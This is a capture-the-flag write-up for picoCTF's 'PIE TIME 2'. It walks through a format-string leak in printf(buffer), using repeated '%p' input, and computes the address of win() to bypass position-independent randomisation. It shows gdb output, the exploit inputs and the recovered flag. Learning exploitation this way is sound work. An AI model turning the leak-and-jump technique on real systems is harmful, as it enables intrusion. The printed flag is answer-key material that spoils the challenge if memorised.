## PIE TIME 2

This was a fun challenge, as it's basically the only one we all solved together. It wasn't very hard, we just overcomplicated it a lot at first.

```c
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```
Taking a look at the source code, it's clear we need to execute the `win()` function to retrieve the flag.

First, we tried using `gdb` to find the address of `win()` in the program, and using that to call it.

```bash
(gdb) print win
$1 = {<text variable, no debug info>} 0x136a <win>
(gdb) print main
$2 = {<text variable, no debug info>} 0x1400 <main>
```

We tried calling `0x136a` directly, but it didn't work - this was to be expected, as the address is different every time we run the program due to address space layout randomization (ASLR).

```bash
(gdb) b call_functions
Breakpoint 1 at 0x12cf
(gdb) run
Starting program: /home/allan/Downloads/vuln
Downloading separate debug info for system-supplied DSO at 0x7ffff7fc3000
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Breakpoint 1, 0x00005555555552cf in call_functions ()
(gdb) print win
$3 = {<text variable, no debug info>} 0x55555555536a <win>
(gdb) print main
$4 = {<text variable, no debug info>} 0x555555555400 <main>
(gdb) exit
```

While this allowed us to see that the two addresses were still the same distance apart, we couldn't actually use `gdb` when the program was running on the server - all we could do is use the two user inputs, which were *"Enter your name:"* and *" enter the address to jump to, ex => 0x12345: "*.

```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

The `call_functions()` function has a format string vulnerability in `printf(buffer)` where the user's input is used as a format string. This allows us to print the addresses of the stack.

```
Enter your name: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

0x5e784df232a1 (nil) 0x5e784df232d0 0x7fffcb20b240 0x7c 0x7fffcb312228 0x7f72331566a0 0x70252e70252e7025 0x252e70252e70252e 0x2e70252e70252e70 0x70252e70252e7025 0x252e70252e70252e 0xa70252e70252e70 0x5e7814675400 0x7fffcb20b2a0 0x5e78146751c0
```

With a bit of trial and error, we subtracted `0x96` from any address in the same address space (`0x5...`). One of these was the address of `main()`, so subtracting the difference between `main()` and `win()` gave us the address of `win()`.

Using `0x5917f9d93400 - 0x96 = 0x5917f9d9336a`: 

```
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

0x5918195652a1 (nil) 0x5918195652d0 0x7ffeb85643c0 0x7c 0x7ffeb856f228 0x77e0087e16a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070252070 0x5917f9d93400 0x7ffeb8564420 0x5917f9d931c0

 enter the address to jump to, ex => 0x12345: 0x5917f9d9336a

You won!
picoCTF{p13_5h0u1dn'7_134k_e7fc8501}
```